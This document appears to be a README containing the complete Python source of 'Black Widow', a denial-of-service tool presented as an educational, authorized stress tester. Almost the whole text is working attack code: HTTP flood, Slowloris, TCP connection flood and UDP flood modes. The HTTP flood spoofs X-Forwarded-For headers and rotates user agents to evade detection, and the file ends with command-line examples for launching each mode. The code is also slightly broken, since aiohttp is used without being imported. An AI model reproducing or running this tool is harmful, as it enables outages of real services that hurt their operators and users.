# BlackWidow
This tool is for educational practices only
#!/usr/bin/env python3
"""
Black Widow - Authorized Network Stress Testing and for educational purposes only use this
at your own risk!
"""

import argparse
import asyncio
import asyncio
import socket
import ssl
import time
import random
import sys
import signal
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

# ── Banner ──────────────────────────────────────────────────────────────────

BANNER = r"""
 ____  _            _    __        ___     _
| __ )| | __ _  ___| | __\ \      / (_) __| | _____      __
|  _ \| |/ _` |/ __| |/ / \ \ /\ / /| |/ _` |/ _ \ \ /\ / /
| |_) | | (_| | (__|   <   \ V  V / | | (_| | (_) \ V  V /
|____/|_|\__,_|\___|_|\_\   \_/\_/  |_|\__,_|\___/ \_/\_/

        Black Widow v1.0  |  Authorized Stress Testing
"""

# ── Config ──────────────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
]

METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]

@dataclass
class Stats:
    sent: int = 0
    success: int = 0
    failed: int = 0
    bytes_sent: int = 0
    start_time: float = field(default_factory=time.time)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)

    async def inc(self, ok: bool = True, size: int = 0):
        async with self.lock:
            self.sent += 1
            if ok:
                self.success += 1
            else:
                self.failed += 1
            self.bytes_sent += size

    def summary(self) -> str:
        elapsed = max(time.time() - self.start_time, 0.001)
        rps = self.sent / elapsed
        return (
            f"\n[*] ── Black Widow Results ──────────────────\n"
            f"    Duration : {elapsed:.1f}s\n"
            f"    Sent     : {self.sent}\n"
            f"    Success  : {self.success}\n"
            f"    Failed   : {self.failed}\n"
            f"    Bytes    : {self.bytes_sent:,}\n"
            f"    Rate     : {rps:.1f} req/s\n"
            f"[*] ─────────────────────────────────────────\n"
        )


# ── Attack modules ──────────────────────────────────────────────────────────

class BlackWidow:
    def __init__(self, target: str, port: int, threads: int, duration: int,
                 method: str = "GET", path: str = "/", proxy: Optional[str] = None,
                 rate_limit: int = 0):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.method = method.upper()
        self.path = path if path.startswith("/") else f"/{path}"
        self.proxy = proxy
        self.rate_limit = rate_limit  # max requests per second per worker (0 = unlimited)
        self.stats = Stats()
        self.running = True
        self.end_time = 0.0

        # Normalize target
        parsed = urlparse(target if "://" in target else f"http://{target}")
        self.host = parsed.hostname or target
        self.scheme = parsed.scheme or "http"
        if parsed.port:
            self.port = parsed.port
        if parsed.path and parsed.path != "/":
            self.path = parsed.path
        self.base_url = f"{self.scheme}://{self.host}:{self.port}{self.path}"

    def _headers(self) -> dict:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "Referer": f"https://www.google.com/search?q={random.randint(1000,9999)}",
        }

    def _payload(self, size: int = 64) -> bytes:
        return random.randbytes(size)

    # ── HTTP flood (async) ───────────────────────────────────────────────────

    async def _http_worker(self, session: aiohttp.ClientSession, worker_id: int): # pyright: ignore[reportUndefinedVariable]
        delay = 1.0 / self.rate_limit if self.rate_limit > 0 else 0
        while self.running and time.time() < self.end_time:
            try:
                headers = self._headers()
                data = None
                if self.method in ("POST", "PUT", "PATCH"):
                    data = self._payload(random.randint(64, 512))

                async with session.request(
                    self.method,
                    self.base_url,
                    headers=headers,
                    data=data,
                    ssl=False,
                    proxy=self.proxy,
                    timeout=aiohttp.ClientTimeout(total=10), # pyright: ignore[reportUndefinedVariable]
                    allow_redirects=False,
                ) as resp:
                    body = await resp.read()
                    await self.stats.inc(ok=True, size=len(body) + (len(data) if data else 0))
            except Exception:
                await self.stats.inc(ok=False)

            if delay:
                await asyncio.sleep(delay)
            else:
                await asyncio.sleep(0)  # yield control

    async def http_flood(self):
        connector = aiohttp.TCPConnector( # pyright: ignore[reportUndefinedVariable]
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            ssl=False,
            force_close=False,
            enable_cleanup_closed=True,
        )
        async with aiohttp.ClientSession(connector=connector) as session: # pyright: ignore[reportUndefinedVariable]
            workers = [
                asyncio.create_task(self._http_worker(session, i))
                for i in range(self.threads)
            ]
            # progress reporter
            reporters = asyncio.create_task(self._progress())
            await asyncio.gather(*workers, return_exceptions=True)
            reporters.cancel()

    # ── Slowloris (slow HTTP headers) ────────────────────────────────────────

    async def _slowloris_worker(self, worker_id: int):
        while self.running and time.time() < self.end_time:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.host, self.port))

                if self.scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)

                # Incomplete request — never send final \r\n\r\n
                req = (
                    f"GET {self.path}?{random.randint(0,9999)} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                )
                sock.send(req.encode())
                await self.stats.inc(ok=True, size=len(req))

                # Keep connection alive with periodic header drips
                while self.running and time.time() < self.end_time:
                    await asyncio.sleep(random.uniform(5, 15))
                    try:
                        header = f"X-a: {random.randint(1,5000)}\r\n"
                        sock.send(header.encode())
                        await self.stats.inc(ok=True, size=len(header))
                    except Exception:
                        break
            except Exception:
                await self.stats.inc(ok=False)
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
            await asyncio.sleep(0.1)

    async def slowloris(self):
        loop = asyncio.get_event_loop()
        # Run blocking sockets in executor threads
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            async def run_worker(wid):
                while self.running and time.time() < self.end_time:
                    await loop.run_in_executor(pool, self._slowloris_sync, wid)

            workers = [asyncio.create_task(run_worker(i)) for i in range(self.threads)]
            reporter = asyncio.create_task(self._progress())
            await asyncio.gather(*workers, return_exceptions=True)
            reporter.cancel()

    def _slowloris_sync(self, worker_id: int):
        """Synchronous slowloris connection held open."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            if self.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)

            req = (
                f"GET {self.path}?{random.randint(0,9999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
            )
            sock.send(req.encode())
            # Use thread-safe counter via asyncio.run_coroutine_threadsafe not needed —
            # approximate with direct increments (stats.sent is best-effort here)
            self.stats.sent += 1
            self.stats.success += 1
            self.stats.bytes_sent += len(req)

            while self.running and time.time() < self.end_time:
                time.sleep(random.uniform(5, 15))
                try:
                    header = f"X-a: {random.randint(1,5000)}\r\n"
                    sock.send(header.encode())
                    self.stats.sent += 1
                    self.stats.success += 1
                    self.stats.bytes_sent += len(header)
                except Exception:
                    break
        except Exception:
            self.stats.sent += 1
            self.stats.failed += 1
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    # ── TCP SYN-style connection flood ───────────────────────────────────────

    async def _tcp_worker(self, worker_id: int):
        loop = asyncio.get_event_loop()
        while self.running and time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                await loop.run_in_executor(None, sock.connect, (self.host, self.port))
                # Send junk data then close
                data = self._payload(random.randint(128, 1024))
                await loop.run_in_executor(None, sock.send, data)
                await self.stats.inc(ok=True, size=len(data))
                sock.close()
            except Exception:
                await self.stats.inc(ok=False)
            await asyncio.sleep(0)

    async def tcp_flood(self):
        workers = [asyncio.create_task(self._tcp_worker(i)) for i in range(self.threads)]
        reporter = asyncio.create_task(self._progress())
        await asyncio.gather(*workers, return_exceptions=True)
        reporter.cancel()

    # ── UDP flood ────────────────────────────────────────────────────────────

    async def _udp_worker(self, worker_id: int):
        loop = asyncio.get_event_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running and time.time() < self.end_time:
            try:
                data = self._payload(random.randint(64, 1024))
                await loop.run_in_executor(None, sock.sendto, data, (self.host, self.port))
                await self.stats.inc(ok=True, size=len(data))
            except Exception:
                await self.stats.inc(ok=False)
            await asyncio.sleep(0)
        sock.close()

    async def udp_flood(self):
        workers = [asyncio.create_task(self._udp_worker(i)) for i in range(self.threads)]
        reporter = asyncio.create_task(self._progress())
        await asyncio.gather(*workers, return_exceptions=True)
        reporter.cancel()

    # ── Progress display ─────────────────────────────────────────────────────

    async def _progress(self):
        try:
            while self.running and time.time() < self.end_time:
                elapsed = time.time() - self.stats.start_time
                remaining = max(0, self.end_time - time.time())
                rps = self.stats.sent / max(elapsed, 0.001)
                print(
                    f"\r[↻] sent={self.stats.sent} ok={self.stats.success} "
                    f"fail={self.stats.failed} rate={rps:.0f}/s "
                    f"left={remaining:.0f}s   ",
                    end="", flush=True,
                )
                await asyncio.sleep(0.5)
        except asyncio.CancelledError:
            pass

    # ── Runner ───────────────────────────────────────────────────────────────

    def stop(self, *_):
        print("\n[!] Stopping Black Widow...")
        self.running = False

    async def run(self, mode: str):
        signal.signal(signal.SIGINT, self.stop)
        self.end_time = time.time() + self.duration
        self.stats.start_time = time.time()

        print(f"[*] Target   : {self.host}:{self.port}{self.path}")
        print(f"[*] Mode     : {mode}")
        print(f"[*] Threads  : {self.threads}")
        print(f"[*] Duration : {self.duration}s")
        print(f"[*] Method   : {self.method}")
        if self.proxy:
            print(f"[*] Proxy    : {self.proxy}")
        print(f"[*] Launching...\n")

        modes = {
            "http": self.http_flood,
            "slowloris": self.slowloris,
            "tcp": self.tcp_flood,
            "udp": self.udp_flood,
        }
        await modes[mode]()
        self.running = False
        print(self.stats.summary())


# ── CLI ──────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        prog="blackwidow",
        description="Black Widow — Authorized network stress testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python blackwidow.py -t 10.0.0.5 -p 80 -m http -c 100 -d 30
  python blackwidow.py -t https://app.example.local -m http -c 200 -d 60 --method POST
  python blackwidow.py -t 10.0.0.5 -p 443 -m slowloris -c 500 -d 120
  python blackwidow.py -t 10.0.0.5 -p 53 -m udp -c 50 -d 15
  python blackwidow.py -t 10.0.0.5 -p 22 -m tcp -c 100 -d 30
        """,
    )
    parser.add_argument("-t", "--target", required=True, help="Target host or URL")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument(
        "-m", "--mode",
        choices=["http", "slowloris", "tcp", "udp"],
        default="http",
        help="Attack mode (default: http)",
    )
    parser.add_argument("-c", "--threads", type=int, default=50, help="Concurrent workers (default: 50)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--method", default="GET", choices=METHODS, help="HTTP method (default: GET)")
    parser.add_argument("--path", default="/", help="HTTP path (default: /)")
    parser.add_argument("--proxy", default=None, help="HTTP proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--rate", type=int, default=0, help="Max req/s per worker (0=unlimited)")
    args = parser.parse_args()

    if args.threads < 1 or args.duration < 1:
        print("[!] threads and duration must be >= 1")
        sys.exit(1)

    bw = BlackWidow(
        target=args.target,
        port=args.port,
        threads=args.threads,
        duration=args.duration,
        method=args.method,
        path=args.path,
        proxy=args.proxy,
        rate_limit=args.rate,
    )
    asyncio.run(bw.run(args.mode))


if __name__ == "__main__":
    main()
